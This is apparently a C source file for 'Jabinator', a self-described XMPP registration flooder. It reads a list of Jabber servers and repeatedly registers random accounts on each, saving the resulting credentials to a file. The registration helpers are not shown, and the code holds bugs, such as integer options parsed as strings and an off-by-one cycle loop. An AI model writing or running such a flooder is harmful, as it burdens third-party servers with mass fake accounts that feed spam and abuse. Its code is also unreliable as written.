#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <loudmouth/loudmouth.h>

#ifndef __LOUDMOUTH_H__
#   error "You're in need of the loudmouth library."
#   error "Arch:    pacman -S loudmouth"
#   error "Github:  https://github.com/mcabber/loudmouth"
#endif

#include <hdr/global.h>

GMainContext *main_context;

static gchar *xmppsfile = NULL;
static gchar *authsoutfile = NULL;
static gint numthreads = 1;
static gint numcycles = 1;

static GOptionEntry entries[] =
{
    { "xmppfile", 'x', 0, G_OPTION_ARG_STRING, &xmppsfile,
      "XMPPs file list for input (e.g. xmpp.list)", NULL },
    { "outfile", 'o', 0, G_OPTION_ARG_STRING, &authsoutfile,
      "Authentications file list to output (e.g. auth.list)", NULL },
    { "threads", 't', 0, G_OPTION_ARG_STRING, &numthreads,
      "Number of threads to use [default=1]", NULL },
    { "cycles", 'c', 0, G_OPTION_ARG_STRING, &numcycles,
      "Number of cycles to register accounts [default=1]", NULL },
    { NULL }
};

int main(int argc, char **argv)
{
    FILE *fp;
    size_t len = 0;
    ssize_t read;
    char *line = NULL;

    GOptionContext *context;

    context = g_option_context_new("- Jabinator - Registration flooder");
    g_option_context_add_main_entries(context, entries, NULL);
    g_option_context_parse(context, &argc, &argv, NULL);
    g_option_context_free(context);

    if(!xmppsfile || !authsoutfile)
    {
        g_printerr("For usage, try %s --help\n", argv[0]);
        return EXIT_FAILURE;
    }

    fp = fopen(xmppsfile, "r");
    if(fp == NULL)
    {
        g_print("%s doesn't exist!\n", xmppsfile);
        return EXIT_FAILURE;
    }

    while((read = getline(&line, &len, fp)) != -1)
    {
        int cycle;
        // TODO: Add threading

        LmConnection *lconnection;

        line[strcspn(line, "\n")] = 0;

        gchar *pubserv = strtok(line, "|");
        gchar *conserv = strtok(NULL, "|");
        gchar *conport = strtok(conserv, ":");
        conport = strtok(NULL, ":");

        printf("pubserv: %s, conserv: %s, conport: %s\n", pubserv, conserv, conport);

        gint jconport = (gint)atoi(conport);

        main_context = g_main_context_new();

        lconnection = xmpp_connect(pubserv, conserv, jconport,
            NULL, NULL, NULL, FALSE);

        for(cycle = 0; cycle <= (int)numcycles; cycle++)
            xmpp_register_rand(pubserv, conserv, conport, authsoutfile, lconnection);
    }

    return EXIT_SUCCESS;
}
